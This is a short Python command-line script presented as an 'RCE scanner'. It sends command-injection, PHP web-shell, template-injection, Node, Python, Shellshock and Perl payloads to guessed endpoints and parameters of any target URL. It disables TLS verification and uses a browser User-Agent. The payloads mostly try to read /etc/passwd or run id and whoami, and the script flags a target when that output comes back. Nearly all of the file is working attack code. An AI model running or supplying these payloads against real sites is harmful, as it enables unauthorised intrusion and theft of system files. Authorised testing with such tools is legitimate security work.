#!/usr/bin/env python3
"""
RCE (Remote Code Execution) Scanner
Detects potential RCE vulnerabilities in web applications
"""

import requests
import sys
import argparse
import warnings
warnings.filterwarnings('ignore')

PAYLOADS = [
    # Command execution
    (";cat /etc/passwd", "passwd"),
    (";ls -la", "ls"),
    ("||whoami", "whoami"),
    ("|id", "id"),
    ("%0acat /etc/passwd", "passwd"),
    # PHP evaluation
    ("<?php system($_GET['c']);?>", "php"),
    ("{{7*7}}", "jinja"),
    ("${7*7}", "jinja"),
    # Node.js
    (";process.mainModule.require('child_process').execSync('cat /etc/passwd')", "node"),
    ("__import__('os').system('cat /etc/passwd')", "python"),
    # Shellshock
    ("() { :; }; cat /etc/passwd", "bash"),
    # Perl
    (";print `cat /etc/passwd`;", "perl"),
]

def check_rce(url, payload, trigger):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    try:
        if '?' in url:
            r = requests.get(url + f"&cmd={payload}", timeout=10, verify=False, headers=headers)
        else:
            r = requests.post(url, data={'cmd': payload}, timeout=10, verify=False, headers=headers)
        
        indicators = ['root:', 'daemon:', 'bin/bash', 'www-data', 'nobody', 'uid=']
        for ind in indicators:
            if ind in r.text.lower():
                return True, ind
    except:
        pass
    return False, None

def scan(target):
    print(f"[*] RCE Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    VulnPaths = ['/api/ping', '/ping', '/api/cmd', '/exec', '/run', '/api/execute', '/shell']
    found = []
    
    for path in VulnPaths:
        url = target + path
        print(f"[*] Testing {url}")
        
        for payload, ptype in PAYLOADS:
            try:
                r = requests.get(url + f"?q={payload}", timeout=10, verify=False)
                if 'root:' in r.text or 'uid=' in r.text or '/bin/' in r.text:
                    print(f"[!] VULN: {url} -> {ptype}")
                    found.append({'url': url, 'type': ptype, 'payload': payload})
            except:
                pass
    
    # Test common params
    print("[*] Testing common parameters...")
    params = ['cmd', 'exec', 'command', 'run', 'code', 'shell', 'system', 'q']
    
    for param in params:
        try:
            r = requests.get(target, params={param: ';id'}, timeout=10, verify=False)
            if 'uid=' in r.text or 'gid=' in r.text:
                print(f"[!] VULN: Parameter '{param}' executable")
                found.append({'param': param, 'type': 'param injection'})
        except:
            pass
    
    print("\n" + "="*50)
    if found:
        print(f"[!] Found {len(found)} potential RCE issues")
        for f in found:
            print(f"  - {f}")
    else:
        print("[*] No RCE vulnerabilities detected")
    
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='RCE Scanner')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)